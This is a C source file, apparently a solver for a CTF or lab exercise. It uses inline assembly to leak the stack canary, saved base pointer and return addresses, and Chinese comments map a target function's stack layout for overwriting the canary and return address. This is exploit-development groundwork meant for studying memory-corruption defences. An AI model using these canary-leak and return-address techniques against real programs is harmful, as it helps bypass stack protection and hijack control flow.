// #include <stdio.h>

// typedef int (*printf_ptr_t)(const char *format, ...);

// void solver(printf_ptr_t fptr)
// {
// 	// find canary first
// 	unsigned long long canary;
// 	__asm__("mov %%fs:0x28, %0": "=r"(canary));
// 	fptr("canary\n");
// 	fptr("0x%llx\n", canary);

// 	// find main rbp
// 	unsigned long *main_rbp;
// 	__asm__("mov %%rbp, %0": "=r"(main_rbp));
// 	fptr("main_rbp\n");
// 	fptr("0x%lx\n", *main_rbp);

// 	// solver's return addr = main + 0xa2ff
// 	unsigned long solver_retadr;
// 	__asm__("movq +0x8(%%rbp), %0": "=r"(solver_retadr));
// 	fptr("solver_retadr\n");
// 	fptr("0x%lx\n", solver_retadr);
//     // guess's return addr = main + 0xa3aa
// 	unsigned long guess_retadr = solver_retadr + 171; //171 = 0xab
// 	fptr("guess_retadr\n");
// 	fptr("0x%lx\n", guess_retadr);
// }

// int main()
// {
// 	char fmt[16] = "** main = %p\n";
// 	printf(fmt, main);
// 	printf("** solver = %p\n", solver);
// 	solver(printf);
// 	return 0;
// }


#include <stdio.h>
#include <stdint.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr)
{
    // find canary first
    uint64_t canary;
    __asm__ volatile ("mov %%fs:0x28, %0" : "=r" (canary));

    fptr("canary\n");
    fptr("0x%llx\n", canary);

    // find main rbp
    uint64_t *main_rbp;
    __asm__ volatile ("mov %%rbp, %0" : "=r" (main_rbp));

    fptr("main_rbp\n");
    fptr("0x%llx\n", *main_rbp);

    // solver's return addr = main + 0xa2ff
    uint64_t solver_retadr;
    __asm__ volatile ("movq +0x8(%%rbp), %0" : "=r" (solver_retadr));

    fptr("solver_retadr\n");
    fptr("0x%llx\n", solver_retadr);

    // guess's return addr = main + 0xa3aa
    uint64_t guess_retadr = solver_retadr + 171;

    fptr("guess_retadr\n");
    fptr("0x%llx\n", guess_retadr);
}

int main()
{
    char fmt[16] = "** main = %p\n";
    printf(fmt, main);
    printf("** solver = %p\n", solver);

    solver(printf);

    return 0;
}



//rbp 是 進入guess後更新成rsp+16byte

//放值時，由低往高放

//magic = rbp + 0x1C = rbp + 0x10 + 0xC
//ret = rbp + 0x8

//canary = rbp - 0x8
//不知名，應該是int val, sz; // 建立整數val和sz
//buffer = rbp - 0x20